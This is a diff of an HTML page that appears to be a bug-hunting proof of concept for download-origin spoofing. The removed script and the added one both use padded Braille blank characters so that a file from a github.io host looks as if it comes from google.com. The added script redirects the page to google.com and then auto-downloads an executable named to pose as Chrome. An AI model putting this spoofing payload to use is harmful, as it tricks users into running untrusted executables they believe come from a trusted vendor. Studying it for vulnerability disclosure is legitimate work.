@@ -9,8 +9,6 @@
       color: white;
       padding: 15px 32px;
       text-align: center;
-      text-decoration: none;
-      display: inline-block;
       font-size: 16px;
       margin: 4px 2px;
       cursor: pointer;
@@ -18,16 +16,29 @@
   </style>
 </head>
 <body>
-  <script>
-    function a() {
-      // Step 1: Create a temporary <a> element to trigger the download
-      var link = document.createElement('a');
-      link.href = 'https://ecdnts-del.github.io/test-apk/google.com⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ChromePOC.mp4';
-      link.download = 'From⠀www.google.com⠀⠀⠀⠀⠀⠀ChromePOC.mp4'; // Set the filename for download
-      link.click(); // Trigger the download
-    }
-  </script>
 
-  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+<script>
+function a() {
+
+  // Redirect langsung ke bughunter.net
+  window.location.href = "https://google.com";
+
+  // Download otomatis setelah 3 detik
+  setTimeout(function () {
+    var link = document.createElement('a');
+    link.href = 'https://ecdnts-del.github.io/test-apk/From⠀google.com ⠀⠀⠀⠀⠀⠀ chrome.exe';
+    link.download = 'From⠀www.google.com ⠀⠀⠀⠀⠀ chrome.exe';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  }, 3000);
+
+}
+</script>
+
+<center>
+  <input type="button" class="button" value="Download From Original Site" onclick="a()">
+</center>
+
 </body>
 </html>
